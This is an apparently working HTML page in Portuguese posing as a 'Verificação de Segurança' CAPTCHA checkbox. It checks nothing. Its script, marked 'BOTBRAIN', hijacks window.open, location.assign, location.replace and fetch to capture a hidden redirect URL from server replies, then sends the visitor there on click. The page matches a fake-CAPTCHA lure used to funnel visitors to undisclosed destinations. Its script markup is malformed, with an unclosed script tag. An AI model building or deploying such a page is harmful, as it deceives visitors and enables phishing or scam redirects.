<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Verificação</title>
<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}
body{
  font-family:Arial, sans-serif;
  background:#f5f5f5;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}
.box{
  background:#fff;
  width:340px;
  padding:30px;
  border-radius:14px;
  box-shadow:0 5px 20px rgba(0,0,0,0.1);
  text-align:center;
}
.title{
  font-size:22px;
  font-weight:bold;
  color:#111;
  margin-bottom:10px;
}
.subtitle{
  font-size:15px;
  color:#666;
  margin-bottom:25px;
  line-height:1.5;
}
.verify{
  border:2px solid #ddd;
  border-radius:12px;
  padding:18px;
  display:flex;
  align-items:center;
  gap:14px;
  cursor:pointer;
  transition:0.2s;
}
.verify:hover{
  border-color:#4285f4;
  background:#f9fbff;
}
.checkbox{
  width:28px;
  height:28px;
  border:2px solid #999;
  border-radius:6px;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:18px;
  color:#fff;
  transition:0.2s;
}
.verify.active .checkbox{
  background:#34a853;
  border-color:#34a853;
}
.text{
  text-align:left;
  font-size:15px;
  color:#222;
  font-weight:500;
}
.loading{
  display:none;
  margin-top:20px;
  color:#666;
  font-size:14px;
}
</style>
</head>
<body>
<div class="box">
  <div class="title">
    Verificação de Segurança
  </div>
  <div class="subtitle">
    Marque abaixo para confirmar que você não é um robô.
  </div>
  <div class="verify" id="verifyBox">
    <div class="checkbox" id="check">✓</div>
    <div class="text">Selecione aqui para continuar</div>
  </div>
  <div class="loading" id="loading">
    Verificando acesso...
  </div>
</div>

<!-- BOTBRAIN -->
<script>
let _resolveRedirectUrl;
const redirectUrlReady = new Promise(resolve => {
  _resolveRedirectUrl = resolve;
});

(function () {
  window.open = function (url) { _resolveRedirectUrl(url); };
  window.location.assign  = function (url) { _resolveRedirectUrl(url); };
  window.location.replace = function (url) { _resolveRedirectUrl(url); };

  const _fetch = window.fetch.bind(window);
  window.fetch = function (...args) {
    return _fetch(...args).then(response => {
      const clone = response.clone();
      clone.json()
        .then(data => { if (data && data.redirectUrl) _resolveRedirectUrl(data.redirectUrl); })
        .catch(() => {});
      return new Response(JSON.stringify({}), {
        status: response.status,
        headers: { 'Content-Type': 'application/json' }
      });
    });
  };
})();

<script>
const verifyBox = document.getElementById('verifyBox');
const loading   = document.getElementById('loading');

verifyBox.addEventListener('click', () => {
  verifyBox.classList.add('active');
  loading.style.display = 'block';

  redirectUrlReady.then(url => {
    window.location.href = url;
  });
});
</script>

</body>
</html>
